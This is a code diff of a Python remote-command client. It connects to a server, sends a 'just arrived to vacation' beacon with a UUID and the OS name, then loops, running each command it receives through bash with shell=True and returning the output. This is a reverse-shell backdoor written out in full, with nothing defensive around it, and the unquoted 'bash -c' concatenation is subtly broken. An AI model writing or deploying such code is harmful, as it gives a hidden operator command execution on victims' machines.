@@ -1,11 +1,14 @@
 import socket
 import sys
-import os
+import subprocess
 import platform
+import time
+import uuid
 
-SRVCONN = ('localhost', 8866)
+SRVCONN = ('localhost', 8870)
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 OS = platform.system()
+
 
 class stdout:
     def __init__(self):
@@ -18,8 +21,8 @@ class stdout:
 def initConn(connectionString):
     sock.connect(connectionString)
     
-def receiveStuff():
-    data = None
+def receiveStuffVariable():
+    data = ""
     try:
         lenReceived = 0
         lenActual = sock.recv(4)
@@ -30,31 +33,33 @@ def receiveStuff():
     finally:
         return data
     
+def receiveStuff():
+    return sock.recv(1024)
+    
 def sendStuff(message):
     try:
-        lenToSend = len(message)
-        sock.send(lenToSend)
-        sock.send(message.encode())
+        #lenToSend = len(message)
+        #sock.send(lenToSend.encode())
+        sock.sendall(message.encode())
     finally:
         pass
     
 def execStuff(command):
-    stdout = sys.stdout
-    stderr = sys.stderr
-    os.system(command.decode())
-    stdout = sys.stdout
-    stderr = sys.stderr
-    if(len(stderr) > 10):
-        return stderr
-    elif(len(stdout) > 5):
-        return stdout
-    else:
-        return ""
+    p = subprocess.Popen("bash -c " + command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout
+    return p.read().decode()
     
         
 def main():
-    initConn(SRVCONN)
-    sendStuff("hello")
     while True:
-        sendStuff(execStuff(receiveStuff()))
-    pass
+        try:
+            initConn(SRVCONN)
+            sendStuff(str(uuid.uuid4()) + ": just arrived to vacation on: " + OS)
+        except socket.error as exc:
+            print("Caught exception socket.error : %s\n" % exc)
+        finally:
+            while True:
+                sendStuff(execStuff(receiveStuff().decode()))
+    
+    
+if __name__ == "__main__":
+    main()
